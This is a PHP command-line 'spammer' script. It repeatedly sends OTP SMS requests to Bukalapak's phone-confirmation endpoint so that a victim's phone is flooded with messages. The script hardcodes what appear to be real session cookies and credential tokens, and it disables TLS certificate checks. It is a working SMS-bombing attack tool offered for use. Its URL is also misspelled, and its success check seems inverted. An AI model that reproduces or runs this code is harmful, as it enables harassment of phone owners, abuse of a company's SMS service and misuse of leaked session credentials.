<?php
/* 
SPAMMER CODE xNet
Modified By: xNet
Date: 10-10-2018
*/
@ini_set('output_buffering',0);
session_start();
error_reporting(0);
set_time_limit(0);
date_default_timezone_set('Asia/Jakarta');
sleep(1);
echo "+-+-+-+-+...::[$ xNet Spammer $]::...-+-+-+-+-+-\n";
sleep(1);
echo "+-+-+-+-+-+-+-+-+-...::[$ xNet $]::...-+-+-+-+-+-+-+-+-+\n";
echo "\nNO HP 	(ex:08xxx) : ";
$no = trim(fgets(STDIN, 1024));
echo "\nJumlah 	(ex:10)    : ";
$loop = trim(fgets(STDIN, 1024));
echo "\n+-+-+-+-+-+-+-+-...::[$ HASIL $]::...-+-+-+-+-+-+-+-+-++\n";
$no = '62'.substr(trim($no), 1);
for ($x=1; $x<=$loop; $x++) {
	$c = curl_init();
	curl_setopt($c, CURLOPT_URL, "hhttps://www.bukalapak.com/trusted_devices/otp_request");
	curl_setopt($c, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($c, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($c, CURLOPT_HTTPHEADER, array(
		'Cookie: identity=27b084558d7b79494e72e2c8757c4def; browser_id=5d57e3949fe052ffc65caaf81b624c2f; session_id=f132f516a305a3aae5ea73821ce0fa50; _ga=GA1.2.994888311.1539171707; _gid=GA1.2.77637092.1539171707; _gcl_au=1.1.944912040.1539171707; _vwo_uuid_v2=DD4DA58D0BFA3323C9912B1B9F9B01B99|4d189eb5c1079364c0884a108c2d9f1d; scs=%7B%22t%22%3A1%7D; __auc=7bc194821665dc87097e5459a00; ins-mig-done=1; ins-gaSSId=5a437385-788d-c155-3bbd-211bffa5bc44_1539175310; spUID=1539171710463b05beca465.29141c0a; _fbp=fb.1.1539171718103.1852482463; insUserData=%7B%22email%22%3A%22xnetcyberteam%40gmail.com%22%7D; user_credentials=4e1fd632ab3034a00f9da696ea1c66d6dfdbe91541954865a1e320e1981e5584f4473d1d1f24a47153097b3dbba67b01f2c7d35893b3a39f86462466dd88933c%3A%3A23198981; __asc=276307161665dca6a3733542926; _gat=1; mp_51467a440ff602e0c13d513c36387ea8_mixpanel=%7B%22distinct_id%22%3A%20%22dt8g5%22%2C%22%24initial_referrer%22%3A%20%22%24direct%22%2C%22%24initial_referring_domain%22%3A%20%22%24direct%22%7D; _td=995e3265-ef33-449a-bdaa-15ca25a411ed; insdrSV=7; lskjfewjrh34ghj23brjh234=dHFrd3o4ZXBkTVVvakVQZEZ5bWpkTXdvUkZLaW9vOFJBZnZlbVg1LzJhLy9mc2xFRFhrajNzQVNXY3JabHJZT2EvUjIzZ3ZDZEVoZFo2d0xXMWRnK3k2d3dUT0hBakpOTlVBZlUyN3ZGdTNVNnB6RVZHQVBiMVdtbFpsZnpsWWhLUjlubmplMExLQVRVZnFOMythaDRWa09qS0F0aHBBU2crOHo4UzZsRmdYUm54VE1ESEFXaGtwNXd3K1FjQlpMOHU5Z1drUzVRN21iZ3JZSkJiK1BlOVZpZjh6ek5rZEFuQkhDWitaSGp4OHgxbnVZeFJ5NVVsMHNleXQ3eUFPV2RPMnVRS1g2YXJvKzhkSVdETkJNU2xJWThKbWh4RnVFd21TRW1UeUNiV0FhemtWbFdVM2tLSTN3S3BOL3U1RCtFQzVySWtSc04rMmJlY2c0VDhqTHZVR1dWUjVNdjJFc2FneXMzQVFiS1BMZ2YwS2ZCNURGQUovS0ZHNEpKMmZiTFM5SnNSSi9YczNmN1VaRldreTJNR1VYRDJOWnM3SVRmY3haMHFaUHhOclVNUkorU0tPZWo3NmxTTFZkK2JoRjVaRTRJOFJrcVJ4d2s0cmdIUVpTU3c9PS0tbGhCVXloUkl0Tnp3TlVsWVgrNVV3Zz09--ee8740850c05b3604a3b7a0d49b238e3ffc6b6e9',
	    'Upgrade-Insecure-Requests: 1',
	    'Origin: https://www.bukalapak.com',
	    'Accept-Encoding: gzip, deflate, br',
	    'Accept-Language: en-US,en;q=0.9',
	    'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.3',
	    'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
	    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
	    'Referer: https://www.bukalapak.com/users/23198981/edit?section=email_phone',
	    'Connection: keep-alive'
	));
	curl_setopt($c, CURLOPT_POSTFIELDS,"feature=phone_confirmation&feature_tag=&manual_phone=$no&channel=SMS&device_fingerprint=a4475d10447040ad6f77efe3b2a61741");
	curl_setopt($c, CURLOPT_POST, 1);
	$hasil = curl_exec($c);
	//FUNGSI FALSE
	if ($hasil == "Bukalapak telah mengirimkan kode otentikasi lewat SMS ke $no") {
		$loop += 1;
		echo "\e[91m$x. Gagal Mengirim :(\n\e[97mCount +1\n".($loop-$x)." Remaining\n\e[93mSleep in 30s\n";
		flush();
		sleep(30);		
	} else {
		echo "   $x. NO HP : [ $no ] [ STATUS : BERHASIL ] [xNet Cyberteam]    \n";
		flush();
		sleep(5);		
	}
}
echo "+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~+\n";
echo "+       ...::[$] xNet Cyberteam Cracker [$]::.        +\n";
echo "+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~+\n";
?>
